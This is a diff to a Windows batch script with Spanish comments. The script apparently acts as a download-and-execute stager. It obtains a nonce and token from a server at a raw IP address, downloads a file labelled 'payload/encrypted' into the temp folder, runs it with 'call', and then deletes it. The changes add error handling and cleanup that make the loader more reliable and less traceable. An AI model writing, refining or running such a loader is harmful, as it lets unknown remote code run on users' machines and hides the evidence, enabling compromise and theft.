@@ -4,20 +4,27 @@ setlocal enabledelayedexpansion
 set BASE=http://82.29.153.101:8080
 set FILE=%temp%\sc.bat
 
-REM ===== AUTH (nonce + token) =====
-curl -s "%BASE%/auth/key" > "%temp%\auth.json"
+REM ===== AUTH =====
+curl -s "%BASE%/auth/key" -o "%temp%\auth.json"
+if errorlevel 1 exit /b 1
 
-REM Extraer NONCE y TOKEN (metodo simple y robusto)
-powershell -NoP -Command "(Get-Content '%temp%\auth.json' | ConvertFrom-Json).nonce" > "%temp%\nonce.txt"
-powershell -NoP -Command "(Get-Content '%temp%\auth.json' | ConvertFrom-Json).token" > "%temp%\token.txt"
+for /f "usebackq delims=" %%i in (`powershell -NoP -Command "(Get-Content '%temp%\auth.json' | ConvertFrom-Json).nonce"`) do set NONCE=%%i
+for /f "usebackq delims=" %%i in (`powershell -NoP -Command "(Get-Content '%temp%\auth.json' | ConvertFrom-Json).token"`) do set TOKEN=%%i
 
-set /p NONCE=<"%temp%\nonce.txt"
-set /p TOKEN=<"%temp%\token.txt"
+del "%temp%\auth.json"
 
-del "%temp%\auth.json" "%temp%\nonce.txt" "%temp%\token.txt"
+if "%NONCE%"=="" exit /b 1
+if "%TOKEN%"=="" exit /b 1
 
 REM ===== PAYLOAD =====
 curl -s -H "X-Nonce: %NONCE%" -H "X-Token: %TOKEN%" "%BASE%/payload/encrypted" -o "%FILE%"
+if errorlevel 1 exit /b 1
+
+REM Validar archivo
+for %%A in ("%FILE%") do if %%~zA==0 exit /b 1
 
 REM ===== EXEC =====
 call "%FILE%"
+
+REM ===== CLEANUP =====
+del "%FILE%"
